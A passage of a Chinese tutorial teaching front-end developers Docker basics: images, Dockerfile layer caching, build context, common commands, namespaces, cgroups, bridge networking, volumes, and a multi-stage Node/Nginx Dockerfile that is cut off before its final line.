<p>正当大家比谁能更好模拟本地服务器环境的时候，docker 跳出来说，对不起，在做的各位都是垃圾。。。我能完全模拟本地服务器环境，嘿嘿！</p>
<p><strong>并且 docker 提供了非常便捷的打包机制，</strong> 并且这个压缩包包含了完整的操作系统文件和目录，也就是包含了这个应用运行所需要的所有依赖。只需：</p>
<pre><code class="hljs language-arduino" lang="arduino">docker build 打包自己的服务
docker run 启动自己的服务
</code></pre>
<p>如此，docker 轻松击败了 pass 本身的打包机制，后来逐渐使容器技术成为云服务的基础设施之一。</p>
<p>你可以想象，就跟前端使用 vite 和 webpack 一样，一键 <code>npm run build xxx</code> 打包后，你的前端应用能在各个浏览器上运行，并帮助我们解决了浏览器兼容性问题，如此便捷，谁能不喜欢这样的技术呢？</p>
<p>所以这个小节我们可以回答常见的面试题：</p>
<ul>
<li>为什么需要容器化 （docker）？</li>
</ul>
<p>既然 docker 这么好用，那 docker 镜像，docker 容器，docker 镜像仓库等等常见概念是什么意思呢？我们拿前端的 npm 包管理来帮助我们理解。</p>
<h2 data-id="heading-15">Docker 必需了解的基础概念</h2>
<h3 data-id="heading-16">1. Docker 镜像和 Docker 容器</h3>
<p>镜像（<code>Image</code>）和容器（<code>Container</code>）的关系，就像是面向对象程序设计中的 <code>类</code> 和 <code>实例</code> 一样，镜像是静态的定义，容器是镜像运行时的实体。</p>
<ul>
<li><strong>Docker 镜像</strong> 是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。</li>
<li><strong>Docker 容器</strong>的实质就是一个进程，但是跟普通进程不一样的是，因此容器可以拥有自己的 <code>root</code> 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。</li>
</ul>
<h3 data-id="heading-17">2. Dockerfile</h3>
<p>dockerfile 是一个文本文件，包含了一系列指令，一般我们都是用这个文件配合 docker build 命令来构建 docker 镜像。</p>
<h3 data-id="heading-18">3. Docker Client、Docker hub、Docker Daemon</h3>
<p>关系如下图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a570165d395b4ae7927cb22d8824e443~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=Jkiiqfu%2BDqq%2F89BYaaYnBznEq5A%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7885b08b51d74326a891fbaf1776b273~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=FLhngk35eljrOBOBGdauK%2FvhUSA%3D" alt="" loading="lazy"/></p>
<p>上图中涉及 3 个重要的概念</p>
<ul>
<li>Docker Hub：Docker Hub 是一个云端托管的Docker镜像库，用户可以在其中存储和共享 docker 镜像。它类似于 npm 仓库。</li>
<li>Docker Daemon：守护进程是一个后台服务，负责管理 docker 容器和镜像。它监听来自的 docker 客户端的命令，并执行相应操作。</li>
<li>Docker Client：允许用户与守护进程交互的命令行工具。</li>
</ul>
<h2 data-id="heading-19">【延伸补充】深入原理1：一定要理解 Docker 镜像的分层的原理</h2>
<p>上面我们说了，<strong>Docker 镜像</strong> 是一个特殊的文件系统，其中有一个特别重要的特性，称之为文件系统分层。为了说明这个原理，我们需要从 linux 本身的文件系统讲起。</p>
<p>首先 linux 启动的时候，首先加载的是 bootfs 文件系统，它包含了 boot 加载器和 kernel 内核。kernel 内核作用是什么呢？我们知道计算机是由硬件构成的，例如 cpu、主板、外设、内存等等，最终这些硬件会被操作系统接手管理，例如，将在硬盘的程序映射为一个个动态的进程，然后增加 cpu 调度算法，让每个进程按照特定的规则不断运行，还需要管理内存，不断的读取内存指令给 cpu 运行。。。</p>
<p>然后 linux 会挂在 rootfs 文件系统，什么是 rootfs 呢？作用是什么呢？我们知道在玩 windows 操作系统的时候，C 盘一般都是用来存储操作系统相关的文件的，例如 C 盘下的 Program Files 一般用来存放操作系统相关的配置文件。</p>
<p>而 linux 中的 rootfs 在初始化的时候，也是把操作系统相关的文件放入其中。linux 有很多不同的发行版本，例如 centos，ubantu 等等，他们都有自己的 rootfs，规则有所不同。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/460a739ec5904cf49ccf1ef798882f92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=O65Hc%2F%2F%2FaD9Lg2MZZ0F8yyhiLSo%3D" alt="" loading="lazy"/></p>
<p>而上面说的两个文件系统，在 docker 中，并不是混在一起的，而是如上图分层了的，这意味着，如果正在使用不同的 docker 镜像，他们最底层的 bootfs 很可能是一样的（相同的 linux 版本），那么这些镜像就可以共享这一层，而不是每个镜像都分别有一个 bootfs。</p>
<p>同理 rootfs 也是一样，如果我们使用的镜像都是基于 ubantu 的 linux 发行版本，版本号也是一样的话，那么 rootfs 也是可以共享的。</p>
<p>这样就会大大降低 docker 的体积，这也是为什么大家说 docker 轻量的原因。</p>
<p>docker 镜像本身提供的这些数据层是只读的，我们后续用 dockerfile 去自定义我们自己的镜像时，实在可读层上面加一个读写层，但是修改 docker 的，所以共享底层的数据层也不会影响我们定制化的 docker 镜像。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15b4b8bedf384df983393bdfe87b3b4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=KAp6f5ZN1Rw6QuAFT%2FEfTCb0Fac%3D" alt="" loading="lazy"/></p>
<p>为什么理解分层如此重要呢？我们举个例子（以下 dockerfile 文件每个命令是什么意思会详细讲解，现在不用在意），以下 docker file 中，我们注意 RUN 命令：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span>

RUN apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span>
RUN apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install <span class="hljs-operator">-</span>y python3
RUN apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install <span class="hljs-operator">-</span>y python3<span class="hljs-operator">-</span>pip
RUN apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> clean
</code></pre>
<p>这里执行了 4 个 RUN 命令，而每个 RUN 命令都会单独在 docker 镜像上建立一个单独的读写层，这样会增大构建后的 docker 镜像体积，我们可以将其合并：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span>

RUN apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span> <span class="hljs-operator">&amp;&amp;</span> \
    apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install <span class="hljs-operator">-</span>y python3 python3<span class="hljs-operator">-</span>pip <span class="hljs-operator">&amp;&amp;</span> \
    apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> clean <span class="hljs-operator">&amp;&amp;</span> \
    rm <span class="hljs-operator">-</span>rf <span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>apt<span class="hljs-operator">/</span>lists<span class="hljs-comment">/*
</span></code></pre>
<p>同样的，如果分层中，分层的内容没有变，docker 会重复利用这些已经打包好的层，什么意思呢？我们前端应用打包的时候，往往 package.json/package.lock.json 的依赖是没有变化的，所以我们如果能利用之前已经下载好的 npm 包的层，就不用重复下载了。</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 使用 Node.js 作为基础镜像</span>
FROM node:<span class="hljs-number">22</span>-slim

<span class="hljs-comment"># 将 package.json 和 package-lock.json 复制到容器中</span>
COPY <span class="hljs-keyword">package</span>*.json ./

<span class="hljs-comment"># 安装依赖（会在此层缓存 node_modules）</span>
RUN npm install

<span class="hljs-comment"># 复制应用程序的其他源代码到容器中</span>
COPY . .

<span class="hljs-comment"># 暴露应用程序运行的端口</span>
EXPOSE <span class="hljs-number">3000</span>

<span class="hljs-comment"># 启动应用程序</span>
CMD [<span class="hljs-string">"npm"</span>, <span class="hljs-string">"start"</span>]
</code></pre>
<p>以上我们会看到 <code>RUN npm install</code> 这一步，如果命令跟以前一样，会利用缓存，不会下载 npm 包，具体缓存规则，官方叙述如下（建议后续看完 dockerfile 章节后再回来看这部分，非常重要）：</p>
<p>在镜像的构建过程中，Docker 会遍历 <code>Dockerfile</code> 文件中的指令，然后按顺序执行。在执行每条指令之前，Docker 都会在缓存中查找是否已经存在可重用的镜像，如果有就使用现存的镜像，不再重复创建。如果你不想在构建过程中使用缓存，你可以在 <code>docker build</code> 命令中使用 <code>--no-cache=true</code> 选项。 但是，如果你想在构建的过程中使用缓存，你得明白什么时候会，什么时候不会找到匹配的镜像，遵循的基本规则如下：</p>
<ul>
<li>从一个基础镜像开始（<code>FROM</code> 指令指定），下一条指令将和该基础镜像的所有子镜像进行匹配，检查这些子镜像被创建时使用的指令是否和被检查的指令完全一样。如果不是，则缓存失效。</li>
<li>在大多数情况下，只需要简单地对比 <code>Dockerfile</code> 中的指令和子镜像。然而，有些指令需要更多的检查和解释。</li>
<li>对于 <code>ADD</code> 和 <code>COPY</code> 指令，镜像中对应文件的内容也会被检查，每个文件都会计算出一个校验和。文件的最后修改时间和最后访问时间不会纳入校验。在缓存的查找过程中，会将这些校验和和已存在镜像中的文件校验和进行对比。如果文件有任何改变，比如内容和元数据，则缓存失效。</li>
<li>除了 <code>ADD</code> 和 <code>COPY</code> 指令，缓存匹配过程不会查看临时容器中的文件来决定缓存是否匹配。例如，当执行完 <code>RUN apt-get -y update</code> 指令后，容器中一些文件被更新，但 Docker 不会检查这些文件。这种情况下，只有指令字符串本身被用来匹配缓存。</li>
</ul>
<p>一旦缓存失效，所有后续的 Dockerfile 指令都将产生新的镜像，缓存不会被使用。</p>
<h2 data-id="heading-20">【延伸补充】深入原理2：一定要理解什么是构建上下文</h2>
<p>上面有一个很容易混淆的路径问题，<code>COPY package*.json ./</code> 中 package*.json 指的并不是 docker build 命令的目录，也不是 <code>Dockerfile</code> 所在的目录，而是执行上下文的目录。执行上下文目录我们是在 docker build 的时候指定的，这里我们指定的 <code>.</code>，表示执行 docker build 命令时的目录。</p>
<p>为什么这个概念如此重要，很有可能你你设置的不对，根本找不到 package*.json，例如你这样</p>
<pre><code class="hljs language-bash" lang="bash">COPY ../package*.json ./
</code></pre>
<p><code>../package*.json</code>，指的是构建上下文上一层目录的 package*.json，其实是找不到的，因为我们将构建上下文复制到 docker host 的时候，docker 只会复制构建上下文内的内容（并且除开 .dockerignore file 指定的排除的内容）。</p>
<p>所以你在构建上下文之外找 package*.json，肯定是找不到的。</p>
<p>并且有相当多网上的人误以为 <code>.</code> 是指定 <code>Dockerfile</code> 所在目录呢？这是因为在默认情况下，如果不额外指定 <code>Dockerfile</code> 的话，会将上下文目录下的名为 <code>Dockerfile</code> 的文件作为 Dockerfile。</p>
<p>这只是默认行为，实际上 <code>Dockerfile</code> 的文件名并不要求必须为 <code>Dockerfile</code>，而且并不要求必须位于上下文目录中，比如可以用 <code>-f ../Dockerfile.php</code> 参数指定某个文件作为 <code>Dockerfile</code>。</p>
<p>当然，一般大家习惯性的会使用默认的文件名 <code>Dockerfile</code>，以及会将其置于镜像构建上下文目录中。</p>
<p>最后最最重要的就是需要写一份 .dockerignore 文件，例如，我们前端项目往往都有 node_modules 目录，而且体积相当大，所以没必要将其复制到 docker host。</p>
<ul>
<li>这会显著增加镜像的体积，从而影响镜像构建时间和传输效率。</li>
<li><code>node_modules</code> 中的某些依赖可能是平台相关的（例如，使用了原生代码或编译步骤），在不同的操作系统（如 Windows 和 Linux）上会有所不同。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/751edbf1964d4253a777394992781d8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=Kno%2FN33OujwUu5h4MQTmHus7seQ%3D" alt="" loading="lazy"/></p>
<p>好了，我们接着编写完 dockerfile 文件继续说。</p>
<p>然后，就可以运行 docker 镜像</p>
<pre><code class="hljs language-arduino" lang="arduino">docker run -d -p <span class="hljs-number">3000</span>:<span class="hljs-number">80</span> react-app
</code></pre>
<ul>
<li><code>-d</code>：以后台模式运行容器。</li>
<li><code>-p 3000:80</code>：将本地的 8080 端口映射到容器的 80 端口。</li>
</ul>
<p>然后本地访问 localhost: 3000，或者你的机器有外网地址，使用 &lt;外网地址&gt;: 3000，访问即可。</p>
<p>这里还会牵扯到一个需要深入讨论的内容，就是容器网络的原理，我们后续再谈。</p>
<p>这里我们总结一下一些常用的 docker 命令，帮助大家快速用起来 docker。</p>
<h3 data-id="heading-21">常用命令总结</h3>
<p><strong>下载镜像</strong>：docker pull &lt;镜像名&gt;，例如下载 node.js 22 版本的镜像</p>
<pre><code class="hljs">docker pull node:22-slim
</code></pre>
<p>注：可以用 docker hub 来搜索支持的版本。方法如下：</p>
<ul>
<li>进入docker hub的官网，地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhub.docker.com%2F" target="_blank" title="https://hub.docker.com/" ref="nofollow noopener noreferrer">hub.docker.com</a></li>
<li>然后搜索需要的镜像：</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3988f9ef8e46490ab302e31d3871e483~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=FD2TnK6Lpe1Bne3QaP8KKcKh0vA%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>查看镜像支持的版本：</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eac86c6febf940ce994e34bd32a0f5e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=dxY5IlqwXvRbaKbeAl8j%2F5%2BqX%2Fs%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<p><strong>列出镜像：</strong></p>
<pre><code class="hljs">docker images 
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38688a35f24a4f9b92c81398c2ba463d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=IafRLnpcdUvZBbkcYRHmrYb6cno%3D" alt="" loading="lazy"/></p>
<p><strong>删除镜像</strong>：docker rmi -f &lt;镜像名&gt;，例如：</p>
<pre><code class="hljs">docker rmi -f nginx
</code></pre>
<p><strong>新建并启动容器：docker run -d -p &lt;本地端口&gt;:&lt;容器端口&gt; &lt;镜像名&gt;，例如</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">docker run -d -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> --name nginx nginx:<span class="hljs-number">1.17</span><span class="hljs-number">.0</span>
</code></pre>
<ul>
<li>
<p>-d 选项：表示后台运行</p>
</li>
<li>
<p>--name 选项：指定运行后容器的名字为nginx,之后可以通过名字来操作容器</p>
</li>
<li>
<p>-p 选项：指定端口映射，格式为：hostPort:containerPort</p>
</li>
</ul>
<p><strong>列出容器：</strong></p>
<pre><code class="hljs">docker ps
</code></pre>
<p><strong>查看运行中的容器</strong>：</p>
<pre><code class="hljs">docker ps
</code></pre>
<p>如果加入 -a 参数，即使暂停的容器也会被列出来。</p>
<p><strong>停止容器</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">docker stop &lt;容器ID | 容器名字&gt;
</code></pre>
<hr/>
<p><strong>删除容器</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">docker <span class="hljs-built_in">rm</span> &lt;容器ID | 容器名字&gt;
</code></pre>
<p><strong>在宿主机查看docker使用cpu、内存、网络、io情况：</strong></p>
<pre><code class="hljs language-xml" lang="xml">docker stats <span class="hljs-tag">&lt;<span class="hljs-name">容器ID</span> | <span class="hljs-attr">容器名字</span>&gt;</span>
</code></pre>
<p><strong>进入Docker容器内部的bash</strong></p>
<pre><code class="hljs language-bash" lang="bash">docker <span class="hljs-built_in">exec</span> -it &lt;容器名字&gt; /bin/bash
</code></pre>
<p>注意，有的镜像里面没有 bash 命令，例如 nginx，可以将 /bin/bash 改为 /bin/sh</p>
<p>以上的知识，足够前端应付常见的场景了，遇到问题搜索一下，看懂也不是难事。其实容器的网络，是比较特殊的，因为容器实际上看起来是有自己独立的文件系统，独立的网络，独立的进程的（也就是在容器中，你会看懂容器进程的 id 是 1）等等。</p>
<p>既然有自己独立的网络，那么容器的网络如何跟外界打通，原理又是什么呢？（这个问题特别重要，无论对于你自己本地调试，还是生产环境解决容器无法访问的问题）</p>
<p>既然有自己独立的文件系统，那么容器销毁，容器里面的文件也随之销毁，那么容器如何做到将文件跟物理机上的文件系统共享的呢？</p>
<h2 data-id="heading-22">【延伸补充】深入原理3：docker 容器的底层三大核心技术</h2>
<p>三大核心技术分别是 namespace、Cgroup 以及联合文件系统，联合文件系统上面已经讲了，现在就剩下 namespace 和 Cgroup 了。我们先来看看 pid namespace 是什么。</p>
<p>首先再次强调，容器就是一个进程。举个例子</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9caf1f5712394135bd6b369da0e82fdd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=IUHJUSoVcTJf%2FK2%2FPPFFPFMXH0A%3D" alt="" loading="lazy"/></p>
<p>我们首先使用以下命令来获取到容器的进程 id 为 2526</p>
<pre><code class="hljs language-bash" lang="bash">docker inspect &lt;容器 <span class="hljs-built_in">id</span>&gt; | grep Pid 
</code></pre>
<p>然后使用 ps 命令来过滤出 2526 进程</p>
<pre><code class="hljs language-perl" lang="perl">ps -ef | <span class="hljs-keyword">grep</span> <span class="hljs-number">2526</span>
</code></pre>
<p>发现确实有对应的进程。</p>
<p>但是跟普通进程不一样的是，容器的进程利用 namespace 技术，让我们进入容器后，发现容器主进程的 pid 是 1 ，而不是 2526。也就是容器使用了"障眼法"，来让自己跟别的容器都隔离开。就拿进程隔离来说，容器是如何修改进程视图的呢？如下图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0ce66bf43fd47d09fe3052a5b27d14c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=9tkQXP8lYTyx9Wi9GjGU5CD4vCU%3D" alt="" loading="lazy"/></p>
<p>如上图，1、2、3、4、5、6、7、8、9、10，都是在物理机操作系统上的进程号（PID），而进入容器后，PID 8 是容器的主进程，linux 将其修改为进程号（PID）为 1，子进程也同样修改 PID，这样你在容器里，看到主进程是 PID 1，但是你退出容器，查看这个容器的进程号，就是 8。</p>
<p>namespace 不仅仅隔离了进程的 pid，还包括网络、用户、IPC 等等。接着我们看看 Cgroup 是什么。</p>
<p>你想想，虽然视图可以改变，但是却没法限制这个容器对 cpu 的使用，所以是有可能单个容器把 cpu 跑满的。所以如果能限制 cpu、内存的使用就更好了，Cgroup 就是做这个事的。</p>
<p>Cgroup 的原理如下图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40a2e69605244305bc66a7e45fb5b267~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=9y8Zn7iHzfraJpWX37bPGDJoWfQ%3D" alt="" loading="lazy"/></p>
<p>Cgroup 对不同资源进行了分组，例如 cpu 总共是 100%，假设分配给某个容器是 25%，当你进入容器中，你看到的自己 cpu 总共是 100% ，也就是这个容器里的 100% 是假的，其实是从真实的 25% 里面去分的。</p>
<p>Cgroup 如何操作是有对应的 linux 命令的，这里我们就不深入了，因为性价比并不高，用好 docker 就可以了。</p>
<h2 data-id="heading-23">【延伸补充】深入原理4：docker 容器网络的秘密</h2>
<p>为了更通俗的解释 docker 的桥接网络，我们先从计算机网络基本的知识讲起：</p>
<p>如下图，只需要一根网线相互连接，然后在计算机上配置一下自己的 ip 地址（在一个网段里），两台计算机就可以相互通信了。例如 A 计算机的 ip 我们写死 ip 到网卡，地址为 192.168.1.1/24，B 计算机是 192.168.1.2/24 ，他们都是 192.168.1.xxx 网段。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8d93afb2a4e41fcaab4fc1775deb8ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=sDm3sjgDlsFnfCwugXRdy%2B8RmjE%3D" alt="" loading="lazy"/></p>
<p>有些同学可能不理解，为啥要分配 ip 地址？因为我们很多通信协议是基于 ip 协议的，例如 http，tcp。所以必须分配 ip 地址，才能让数据包走出网卡。我们接着聊:</p>
<p>现在我们多加一些电脑，这时候一根网线肯定就不够了，我们就加入一个交换机（虚拟交换机是有 ip 的，但是现实生活中的交换机是没有 ip），如下图</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8329e75a78ee43bd83f814a96565e1e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=%2B7BU4vfRoF7tpIT3h7fF8fwW2OE%3D" alt="" loading="lazy"/></p>
<p>假设交换机的 ip 是 192.168.1.1/24，这个交换机还可以自动分配 ip（dhcp协议），只要计算机连接交换机，就会自动分配一个不重复的 ip 地址，那么多台计算机互相通信就解决了。</p>
<p>其实 docker 内部默认有一个叫做 docker0 的网桥，这个网桥工作机制就跟我们上面说的交换机类似。而容器默认情况下，会连接 docker 0 网桥。如下图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32d6362471ac450492a7a8be0f5f9368~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=HHoBlHiBNSVLrarn8RgpPDg8AmE%3D" alt="" loading="lazy"/></p>
<p><strong>这样容器之间互通的问题我们就解决了。</strong></p>
<p>那么如何解决容器跟外部网络通信的问题，例如某个容器去访问微信登录。</p>
<p>如下图，其实 docker0 是连接到我们真实物理机的网卡 eth0 来转发数据，从而让容器的数据通过 -&gt; docker0 -&gt; eth0 发送到计算机外部</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/619e592a6b874215b0bcb41f17da744f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=PZPhQEYZ91jX7fsMbKKyTY4fADw%3D" alt="" loading="lazy"/></p>
<p>这里又有问题了，容器内部的 ip 往往是一个内部地址，什么是内部地址？你会看到，我们前端启动前端应用，经常看到启动的 ip 地址是 192.168.x.x，你回到家启动前端应用分配的地址居然是一样的 192.168.x.x。我们知道 ip 地址必须全网唯一，为啥在家里分配的 ip 和在公司分配的 ip 一样呢？</p>
<p>这是因为 ip 地址规定了一些只能在内网通讯的地址，不能用在外网，例如 192.168.x.x 就是不会用在外部网络访问的 ip 地址。</p>
<p>这对于 docker 容器访问外部网络就有问题了，你想想 docker容器 -&gt; docker0 -&gt; eth0 将数据包传给了微信服务器，微信服务不能说我回传的 ip 地址是 docker容器的 ip，因为 docker容器的 ip 是内部地址，不能在网络上传输。</p>
<p>这里又涉及一个概念，叫 nat 转换，也就是 docker 容器将数据包传给 eth0 的时候，会改写自己数据包发送端的 ip 地址为 eth0 的公网地址。</p>
<p><strong>这样就解决了容器访问外部网络的问题了。</strong></p>
<p>问题又来了哦，那返回给 eth0 的数据，如何知道这个数据包最终转发给哪个容器呢？这里涉及到一个叫做 iptables 的工具（NAT 转换也是依赖它），它可以记录转发规则，例如如果这个数据是从 80 端口出去的，那么返回的时候，就返回给 A 容对应的内部 ip。</p>
<h2 data-id="heading-24">【延伸补充】深入原理5：docker 容器文件隔离和共享的秘密</h2>
<p><strong>文件隔离</strong></p>
<p>docker 容器的文件系统是跟宿主机隔离的，在 docker 里，我们能看到一份独立的文件系统。linux 如何实现的呢？</p>
<p>实际上 linux 也是用了障眼法做到的，如下图，首先假设下图是正常的某台 linux 机器的目录结构：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2ba4a7f3e82450689860ceac12ac9a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=lVn%2Fidbfvt6nXwvpv6%2BgosHvcVs%3D" alt="" loading="lazy"/></p>
<p>然后我们希望 docker 容器跟 joe 目录（最右边最后一个目录）拿来作为容器的根目录，使用 linux 的 Mount Namespac 功能 + chroot 命令，结果如下图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/224342bce84c4d8f808c3cdcf12aa387~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f56WlX-aIkOmDvQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853776&amp;x-signature=mzAa52GcFrI1Yv92LJOZUEVqALw%3D" alt="" loading="lazy"/></p>
<p>容器的根目录，挂载到了宿主机的 joe 目录。由于 Mount Namespace 技术的特性，这个容器的根目录对于宿主机是看不见的。</p>
<p>而这在某些情况下不是我们想要的。比如数据库文件，我们想留在宿主机上，这样重启容器的时候，依然保留了数据库的数据。</p>
<p>而这里要使用到的挂载技术，就是Linux的<strong>绑定挂载（bind mount）机制</strong>。它的主要作用就是，允许你将一个目录或者文件，而不是整个设备，挂载到一个指定的目录上。并且，这时你在该挂载点上进行的任何操作，只是发生在被挂载的目录或者文件上，而原挂载点的内容则会被隐藏起来且不受影响。</p>
<p><strong>文件共享</strong></p>
<p>由于容器的特性，如果容器删除，那么容器里的数据也会删除，之前的挂载功能也会解除。可是在某些情况下，我们希望保留容器里的数据，例如数据库，方便再下一次启动镜像的时候能共享之前容器的数据。</p>
<p>这个功能在 docker 叫做绑定 <strong>Volume 功能。</strong> 这个功能的实现其实很简单，之间我们讲的绑定挂载，其实需要分为两步，第一步开启 Mount Namespace，此时容器内部仍然可以看到宿主机的目录，但是宿主机看不到容器的目录，第二步执行类似 chroot 命令，可以简单理解为执行后，容器就看不到宿主机目录了。</p>
<p>所以我们可以在第一步之前，把 Volume 指定的宿主机目录（比如/home目录），挂载到指定的容器目录（比如/test目录）在宿主机上对应的目录上，这个 Volume 的挂载工作就完成了。</p>
<h2 data-id="heading-25">最后补充</h2>
<p>补充，之前前端部署的 dockerfile 一般都会用分阶段构建的方法，首先借助 node.js 镜像打包前端应用，然后将打包好的内容放入 nginx 镜像中，最后借助 nginx 作为 web 服务器，来让外网访问。我们简单实现一下，可用在生产环境：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Use the official Node.js runtime as the base image</span>
FROM node:20-slim as build

<span class="hljs-comment"># Set the working directory in the container</span>
WORKDIR /app

<span class="hljs-comment"># Copy package.json and package-lock.json to the working directory</span>
COPY package*.json ./

<span class="hljs-comment"># Install dependencies</span>
RUN npm install

<span class="hljs-comment"># Copy the entire application code to the container</span>
COPY . .

<span class="hljs-comment"># Build the React app for production</span>
RUN npm run build

<span class="hljs-comment"># Use Nginx as the production server</span>
FROM nginx:alpine

<span class="hljs-comment"># Copy the built React app to Nginx's web server directory</span>
COPY --from=build /app/build /usr/share/nginx/html

<span class="hljs-comment"># Expose port 80 for the Nginx server</span>
EXPOSE 80

<span class="hljs-comment"># Start Nginx when the container runs</span>
